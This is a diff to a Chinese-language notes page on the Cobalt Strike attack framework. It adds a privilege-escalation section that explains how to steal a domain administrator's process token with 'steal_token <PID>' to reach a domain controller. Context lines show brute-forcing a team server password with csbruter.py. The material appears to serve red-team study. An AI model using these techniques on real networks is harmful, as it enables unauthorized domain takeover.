@@ -1,7 +1,7 @@
 # CobaltStrike
 
 <p align="center">
-    <img src="../../../assets/img/logo/cobaltstrike.png" width="30%"></a>
+    <img src="../../../assets/img/logo/cobaltstrike.png" width="30%">
 </p>
 
 ---
@@ -38,6 +38,10 @@ cd csbruter
 cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
 ```
 
+---
+
+### 安装及维护
+
 **使用**
 - 服务端
 
@@ -50,3 +54,14 @@ cat wordlist.txt | python3 csbruter.py xxx.xxx.xxx.xxx
     或
 
     `javaw -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar`
+
+---
+
+### 权限提升
+
+**令牌假冒**
+
+当你获取了本地计算机的 system 权限后，如果这台机器上有域用户跑的进程，就直接可以窃取域账号的 token，然后从本地用户组跨入域环境。如果这台机器上有域管的开的进程，那么直接 steal token 后就可以登录域控了。
+```
+steal_token <PID>
+```
